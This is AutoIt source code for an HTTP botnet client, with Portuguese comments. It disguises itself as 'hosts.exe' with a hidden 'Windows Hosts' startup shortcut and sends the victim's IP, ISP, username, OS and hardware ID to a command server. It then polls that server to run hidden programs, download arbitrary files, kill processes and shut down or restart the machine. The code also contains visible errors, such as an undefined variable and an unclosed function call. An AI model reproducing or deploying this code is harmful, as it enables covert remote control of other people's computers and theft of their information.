#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Start Date:     24 mar 19:12
 End Date:		 25 mar 01:07
 Author:         KN1v7
 Client Version: 1.1
 Update Code:    26 mar 02:08
 Github:         https://github.com/Kanui-C

 Script Function:
	Um Client De Botnet HTTP

#ce ----------------------------------------------------------------------------

; Inicio do Script

#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
#include <Inet.au3>
#include <WinAPIDiag.au3>
#include <Crypt.au3>


Global $ServerIp = "http://192.168.0.103"
Global $InternetProtocol = _GetIP()
Global $Provedora = _INetGetSource("http://ip-api.com/line?fields=isp")
Global $HardwareID = _GetHardwareID()
Global $ComputerName = @ComputerName
Global $os = @OSVersion
Global $bit = @OSArch
Global $username = @UserName
Global $date = _NowDate()
start()
While 1
   Local $getcmd = _INetGetSource($ServerIp & "/cmd.php?hwid=" & $HardwareID) ; Recebe o source code da pagina de comandos
   if $getcmd Then
	  Executar($getcmd)
   EndIf
   Sleep(10000)
WEnd

SendData()
Func SendData()
   $Dados = "eip=" & $InternetProtocol & @CRLF & "&os=" & $os & @CRLF  & "&osarch=" & $bit & @CRLF _
			& "&computername=" & $ComputerName & @CRLF & "&username=" & $username & @CRLF & "&date=" & $date &  @CRLF _
			& "&isp=" & $provedora & "&hwid=" & $HardwareId ; Variavel Responsavel por enviar todas as informaçoes obtidas
   $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc") ;Definindo manipulador de eventos
   $oHTTP = ObjCreate("winhttp.winhttprequest.5.1") ; Objeto com Suporte ao Protocolo HTTP
   $oHTTP.Open("POST", $ServerIP & "/getinfo.php", False)
   $oHTTP.SetRequestHeader("User-Agent", "KN1v7-BOT")
   $oHTTP.SetRequestHeader("Referrer", "http://www.yahoo.com")
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded") ; É importante definir o context-type,caso estiver nulo o navegador preenche automaticamente
   $oHTTP.Send($Dados) ; Enviando a requisiçao
   $oReceived = $oHTTP.ResponseText
   ConsoleWrite($oReceived)

EndFunc



; #Commands# ====================================================================================================================
;Comandos ....: Executar comando
;				Download de arquivo
;				Matar processo
;				Desligar
;				Reiniciar
; ===============================================================================================================================

Func Executar($comando)
   ConsoleWrite($comando)
   If StringInStr($comando, "exec!", 2) Then
	  $exec = StringSplit($comando, "!")
	  If StringInStr($exec[2], "oculto+",2) Then
		 $shw = StringSplit($exec[2], "+")
		 Run($shw[2], "", @SW_SHOW)
	  Else
		 Run($exec[2], "", @SW_HIDE)
	  EndIf

   ElseIf StringInStr($comando, "KILL!", 2) Then ;Mata o processo pelo nome
	  $exec = StringSplit($comando, "!")
	  Run("TASKKILL /F /IM " & $exec[2] & ".exe", "", @SW_HIDE)

   ElseIf StringInStr($comando, "DOWNLOAD!", 2) Then ; Download De Arquivos
	  $exec = StringSplit($comando, "!") ;DOWNLOAD!http://link/arquivo.exe?nomepsalv.exe
	  InetGet($exec[2], $exec[3], 1, 0)

   ElseIf StringInStr($con, "REINFECT", 2) Then ; Roda a persistencia novamente
	  start()

   ElseIf StringInStr($con, "SHUTDOWN", 2) Then ; Desliga
	  Shutdown(6)

   ElseIf StringInStr($con, "RESTART", 2) Then ; Reinicia
	  Shutdown(2)

   ElseIf StringInStr($con, "UNISTALL", 2) Then ;Remove persistencia
	  FileDelete(@StartupDir & "\run.lnk"

   EndIf
EndFunc




Func Start()
	Local Const $sfilepath = @StartupDir & "\run.lnk"
	FileCreateShortcut(@AppDataDir & "\hosts.exe", $sfilepath, @AppDataDir, "/e,c:\", "Windows Hosts", @SystemDir & "\shell32.dll", "^!t", "15", @SW_HIDE)
	Local $adetails = FileGetShortcut($sfilepath)
    FileCopy(@ScriptFullPath, @AppDataDir & "\hosts.exe", 1)
	SendData()
EndFunc


; #FUNCTION# ====================================================================================================================
; Name ..........: _GetHardwareID
; Description ...: Generates a unique hardware identifier (ID) for the local computer.
; Syntax ........: _GetHardwareID([$iFlags = Default])
; Parameters ....: $iFlags   - [optional] The flags that specifies what information would be used to generate ID.
;                            This parameter can be one or more of the following values.
;
;                            $UHID_MB (0)
;                            Uses information about your motherboard. This flag is used by default regardless of whether specified or not.
;
;                            $UHID_BIOS (1)
;                            Uses information about the BIOS.
;
;                            $UHID_CPU (2)
;                            Uses information about the processor(s).
;
;                            $UHID_HDD (4)
;                            Uses information about the installed hard drives. Any change in the configuration disks will change ID
;                            returned by this function. Taken into account only non-removable disks.
;
;                            $UHID_All (7)
;                            The sum of all the previous flags. Default is $UHID_MB (0).
;
;                  $bIs64Bit - [optional] Search the 64-bit section of the registry. Default is dependant on AutoIt bit version.
;                            Note: 64-bit can't be searched when running the 32-bit version of AutoIt.
; Return values..: Success - The string representation of the ID. @extended returns the value that contains a combination of flags
;                            specified in the $iFlags parameter. If flag is set, appropriate information is received successfully,
;                            otherwise fails. The function checks only flags that were specified in the $iFlags parameter.
;                  Failure - Null and sets @error to non-zero.
; Author.........: guinness with the idea by Yashied (_WinAPI_UniqueHardwareID() - WinAPIDiag.au3)
; Modified ......: Additional suggestions by SmOke_N.
; Remarks .......: The constants above can be found in APIDiagConstant.au3. It also requires StringConstants.au3 and Crypt.au3 to be included.
; Example........: Yes
; ===============================================================================================================================
Func _GetHardwareID($iFlags = Default, $bIs64Bit = Default)
    Local $sBit = @AutoItX64 ? '64' : ''

    If IsBool($bIs64Bit) Then
        ; Use 64-bit if $bIs64Bit is true and AutoIt is a 64-bit process; otherwise 32-bit
        $sBit = $bIs64Bit And @AutoItX64 ? '64' : ''
    EndIf

    If $iFlags == Default Then
        $iFlags = $UHID_MB
    EndIf

    Local $aSystem = ['Identifier', 'VideoBiosDate', 'VideoBiosVersion'], _
            $iResult = 0, _
            $sHKLM = 'HKEY_LOCAL_MACHINE' & $sBit, $sOutput = '', $sText = ''

    For $i = 0 To UBound($aSystem) - 1
        $sOutput &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\', $aSystem[$i])
    Next
    $sOutput &= @CPUArch
    $sOutput = StringStripWS($sOutput, $STR_STRIPALL)

    If BitAND($iFlags, $UHID_BIOS) Then
        Local $aBIOS = ['BaseBoardManufacturer', 'BaseBoardProduct', 'BaseBoardVersion', 'BIOSVendor', 'BIOSReleaseDate']
        $sText = ''
        For $i = 0 To UBound($aBIOS) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\BIOS\', $aBIOS[$i])
        Next
        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_BIOS
            $sOutput &= $sText
        EndIf
    EndIf

    If BitAND($iFlags, $UHID_CPU) Then
        Local $aProcessor = ['ProcessorNameString', '~MHz', 'Identifier', 'VendorIdentifier']

        $sText = ''
        For $i = 0 To UBound($aProcessor) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\CentralProcessor\0\', $aProcessor[$i])
        Next

        For $i = 0 To UBound($aProcessor) - 1
            $sText &= RegRead($sHKLM & '\HARDWARE\DESCRIPTION\System\CentralProcessor\1\', $aProcessor[$i])
        Next

        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_CPU
            $sOutput &= $sText
        EndIf
    EndIf

    If BitAND($iFlags, $UHID_HDD) Then
        Local $aDrives = DriveGetDrive('FIXED')

        $sText = ''
        For $i = 1 To UBound($aDrives) - 1
            $sText &= DriveGetSerial($aDrives[$i])
        Next

        $sText = StringStripWS($sText, $STR_STRIPALL)
        If $sText Then
            $iResult += $UHID_HDD
            $sOutput &= $sText
        EndIf
    EndIf

    Local $sHash = StringTrimLeft(_Crypt_HashData($sOutput, $CALG_MD5), StringLen('0x'))
    If Not $sHash Then
        Return SetError(1, 0, Null)
    EndIf

    Return SetExtended($iResult, StringRegExpReplace($sHash, '([[:xdigit:]]{8})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{4})([[:xdigit:]]{12})', '{\1-\2-\3-\4-\5}'))
 EndFunc   ;==>_GetHardwareID

